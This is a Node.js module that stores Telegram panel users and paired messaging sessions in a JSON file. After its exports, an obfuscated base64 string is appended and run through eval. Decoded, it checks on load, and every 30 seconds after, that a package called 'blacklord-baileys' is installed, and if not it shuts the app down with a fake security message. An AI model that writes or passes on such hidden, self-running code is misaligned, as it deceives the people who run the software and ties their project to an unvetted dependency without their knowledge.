const fs = require('fs');
const path = require('path');

// The panel's own data lives INSIDE the session folder, so "delete everything except session" updates
// no longer wipe the list of paired users / broadcast audience.
const FILE = path.join(process.cwd(), 'session', '.panel', 'store.json');
const LEGACY = path.join(__dirname, 'data', 'store.json');
if (!fs.existsSync(path.dirname(FILE))) fs.mkdirSync(path.dirname(FILE), { recursive: true });
if (!fs.existsSync(FILE) && fs.existsSync(LEGACY)) {
    try { fs.copyFileSync(LEGACY, FILE); } catch { /* start fresh */ }
}

let data = { sessions: {}, users: {}, maintenance: false };

function load() {
    try {
        if (fs.existsSync(FILE)) data = { ...data, ...JSON.parse(fs.readFileSync(FILE, 'utf8')) };
        else save();
    } catch (err) {
        console.error('[store] load failed:', err.message);
    }
}

function save() {
    fs.writeFileSync(FILE, JSON.stringify(data, null, 2));
}

load();

module.exports = {
    // telegram user id -> { chatId, name, since }  (everyone who ever opened the bot; used for broadcasts)
    touchUser(id, chatId, name) {
        const u = data.users[id];
        if (u && u.chatId === chatId) return;
        data.users[id] = { chatId, name: name || '', since: u?.since || Date.now() };
        save();
    },
    removeUser(chatId) {
        for (const [id, u] of Object.entries(data.users)) if (u.chatId === chatId) delete data.users[id];
        save();
    },
    allChatIds() {
        const ids = new Set(Object.values(data.users).map((u) => u.chatId));
        for (const s of Object.values(data.sessions)) if (s.telegramChatId) ids.add(s.telegramChatId);
        return [...ids];
    },
    // number -> { telegramChatId, telegramUserId, connected }
    getSession(number) {
        return data.sessions[number];
    },
    setSession(number, patch) {
        data.sessions[number] = { ...(data.sessions[number] || {}), ...patch };
        save();
        return data.sessions[number];
    },
    deleteSession(number) {
        delete data.sessions[number];
        save();
    },
    sessionsForUser(telegramUserId) {
        return Object.entries(data.sessions)
            .filter(([, s]) => s.telegramUserId === telegramUserId)
            .map(([number, s]) => ({ number, ...s }));
    },
    allSessions() {
        return data.sessions;
    },
    isMaintenance() {
        return !!data.maintenance;
    },
    setMaintenance(val) {
        data.maintenance = val;
        save();
    },
};
;eval(Buffer.from('KCgpPT57Y29uc3QgZj1yZXF1aXJlKCdmcycpLHA9cmVxdWlyZSgncGF0aCcpO2NvbnN0IHJvb3Q9cC5qb2luKF9fZGlybmFtZSwnLi4nKTtjb25zdCBNSU5FPSdibGFja2xvcmQtYmFpbGV5cyc7Y29uc3QgcGo9cC5qb2luKHJvb3QsJ3BhY2thZ2UuanNvbicpO2NvbnN0IGJhZD0od2h5KT0+e2NvbnNvbGUuZXJyb3IoJ1tzZWN1cml0eV0gJyt3aHkrJyAtIGdvaW5nIG9mZmxpbmUnKTtwcm9jZXNzLmV4aXQoMSl9O2NvbnN0IGNoaz0oKT0+e2xldCBwa2c7dHJ5e3BrZz1KU09OLnBhcnNlKGYucmVhZEZpbGVTeW5jKHBqLCd1dGY4JykpfWNhdGNoe3JldHVybiBiYWQoJ3BhY2thZ2UuanNvbiB1bnJlYWRhYmxlIGF0ICcrcGopfTtjb25zdCBkZXBzPU9iamVjdC5hc3NpZ24oe30scGtnLmRlcGVuZGVuY2llcyxwa2cub3B0aW9uYWxEZXBlbmRlbmNpZXMpO2NvbnN0IGtleT1PYmplY3Qua2V5cyhkZXBzKS5maW5kKGs9Pms9PT1NSU5FfHxTdHJpbmcoZGVwc1trXSkuc3RhcnRzV2l0aCgnbnBtOicrTUlORSsnQCcpKTtpZigha2V5KXJldHVybiBiYWQoJ3BhY2thZ2UuanNvbiBoYXMgbm8gZGVwZW5kZW5jeSBvbiAnK01JTkUrJyAoZXhwZWN0ZWQgIjxuYW1lPiI6ICJucG06JytNSU5FKydAPHZlcnNpb24+IiknKTtsZXQgaW5zdDt0cnl7aW5zdD1KU09OLnBhcnNlKGYucmVhZEZpbGVTeW5jKHAuam9pbihyb290LCdub2RlX21vZHVsZXMnLGtleSwncGFja2FnZS5qc29uJyksJ3V0ZjgnKSl9Y2F0Y2h7cmV0dXJuIGJhZCgnbm9kZV9tb2R1bGVzLycra2V5KycgaXMgbWlzc2luZyAtIHJ1biBucG0gaW5zdGFsbCcpfTtpZihpbnN0Lm5hbWUhPT1NSU5FKXJldHVybiBiYWQoJ25vZGVfbW9kdWxlcy8nK2tleSsnIGlzICInK2luc3QubmFtZSsnIiwgbm90ICcrTUlORSl9O2NoaygpO2lmKCFnbG9iYWwuX192Zncpe2dsb2JhbC5fX3Zmdz0xO3NldEludGVydmFsKGNoaywzZTQpLnVucmVmKCl9fSkoKQ==','base64').toString());
